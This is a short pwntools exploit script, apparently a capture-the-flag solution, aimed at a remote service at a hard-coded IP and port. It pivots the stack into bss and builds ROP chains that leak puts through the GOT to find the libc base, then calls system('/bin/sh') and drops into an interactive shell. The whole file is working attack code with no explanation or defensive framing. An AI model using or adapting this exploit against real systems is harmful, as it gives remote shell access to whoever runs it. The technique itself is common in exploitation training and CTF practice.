from pwn import *
context(arch='amd64',log_level = 'debug')
 
libc = ELF('./libc.so.6')
elf = ELF('./pwn')

#
io = connect('47.97.58.52', 43001)
#io = process('./pwn')
#pause()
bss=0x404ff0#any writable addr
vlun=0x40120d#ret2

#把rbp弄到bss
io.recvuntil('stack ~\n')
pl=b'a'*0x20
pl+=p64(bss)
pl+=p64(vlun)
io.send(pl)

#target address
ta=bss-0x20
leave=0x401234
rdi=0x4012c3
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
vlun=0x40120A

#io.recvuntil('stack ~\n')
pl=p64(rdi)
pl+=p64(puts_got)
pl+=p64(puts_plt)
pl+=p64(vlun)
pl+=p64(ta-8)
pl+=p64(leave)#让rip到pl的第一句
io.send(pl)

pr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))#puts real
lb=pr-libc.sym['puts']#libc base
sa=lb+libc.sym['system']#system addr
ba=lb+libc.search('/bin/sh').__next__()

pl=p64(rdi)
pl+=p64(ba)
pl+=p64(sa)
pl+=p64(vlun)
pl+=p64(ta-8)
pl+=p64(leave)
io.send(pl)

io.interactive()
